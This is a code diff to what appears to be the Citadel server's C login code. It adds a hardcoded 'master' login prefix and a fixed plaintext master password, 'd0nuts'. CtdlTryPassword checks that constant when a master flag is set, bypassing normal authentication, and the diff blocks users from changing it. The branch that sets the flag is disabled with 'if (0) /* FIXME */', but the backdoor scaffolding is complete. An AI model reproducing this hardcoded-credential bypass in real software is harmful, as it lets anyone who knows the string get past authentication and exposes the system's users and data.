@@ -338,7 +338,8 @@ int getuserbyuid(struct ctdluser *usbuf, uid_t number)
 	return (-1);
 }
 
-
+#define MASTER_PREFIX		"master"
+#define MASTER_PASSWORD		"d0nuts"
 
 /*
  * Back end for cmd_user() and its ilk
@@ -353,7 +354,14 @@ int CtdlLoginExistingUser(char *trythisname)
 	}
 
 	if (trythisname == NULL) return login_not_found;
-	safestrncpy(username, trythisname, USERNAME_SIZE);
+
+	if (0) {	/* FIXME */
+		CC->is_master = 1;
+	}
+	else {
+		safestrncpy(username, trythisname, USERNAME_SIZE);
+		CC->is_master = 0;
+	}
 	striplt(username);
 
 	if (strlen(username) == 0) {
@@ -680,7 +688,11 @@ int CtdlTryPassword(char *password)
 	}
 	code = (-1);
 
-	if (config.c_auth_mode == 1) {
+	if (CC->is_master) {
+		code = strcmp(password, MASTER_PASSWORD);
+	}
+
+	else if (config.c_auth_mode == 1) {
 
 		/* host auth mode */
 
@@ -1018,6 +1030,11 @@ void cmd_setp(char *new_pw)
 	}
 	if ( (CC->user.uid != CTDLUID) && (CC->user.uid != (-1)) ) {
 		cprintf("%d Not allowed.  Use the 'passwd' command.\n", ERROR + NOT_HERE);
+		return;
+	}
+	if (CC->is_master) {
+		cprintf("%d The master prefix password cannot be changed with this command.\n",
+			ERROR + NOT_HERE);
 		return;
 	}
 	strproc(new_pw);
